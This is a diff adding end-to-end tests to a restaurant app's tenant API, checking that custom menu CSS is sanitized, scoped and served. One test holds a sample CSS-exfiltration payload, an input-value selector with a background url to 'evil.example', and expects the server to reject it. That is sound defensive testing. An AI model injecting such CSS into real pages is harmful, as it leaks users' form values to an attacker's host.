@@ -96,6 +96,43 @@ describe("customer experience + ZATCA foundation (e2e)", () => {
         .send({ vatNumber: "123" })
         .expect(400);
     });
+
+    it("rejects a CSS-exfiltration attempt in the custom menu design", async () => {
+      const res = await request(http)
+        .patch("/tenant")
+        .set("Authorization", `Bearer ${ownerA}`)
+        .send({
+          menuTemplate: "custom",
+          menuCustomCss: 'input[value^="1"] { background: url(https://evil.example/log?1) }',
+        })
+        .expect(400);
+      expect(res.body.message).toMatch(/url/i);
+    });
+
+    it("sanitizes, scopes, saves, and publicly serves valid custom menu CSS", async () => {
+      const res = await request(http)
+        .patch("/tenant")
+        .set("Authorization", `Bearer ${ownerA}`)
+        .send({
+          menuTemplate: "custom",
+          menuCustomCss: ".product-card { border-radius: 4px; }",
+        })
+        .expect(200);
+      expect(res.body.menuTemplate).toBe("custom");
+      expect(res.body.menuCustomCss).toContain("spx-menu-custom .product-card");
+      expect(res.body.menuCustomCss).not.toContain("url(");
+
+      const publicRes = await request(http).get("/public/restaurants/cx-a").expect(200);
+      expect(publicRes.body.restaurant.menuTemplate).toBe("custom");
+      expect(publicRes.body.restaurant.menuCustomCss).toContain("spx-menu-custom .product-card");
+
+      // Reset back to a preset so later tests in this file see the default appearance.
+      await request(http)
+        .patch("/tenant")
+        .set("Authorization", `Bearer ${ownerA}`)
+        .send({ menuTemplate: "classic" })
+        .expect(200);
+    });
   });
 
   describe("external ordering link (/restaurant/{slug})", () => {
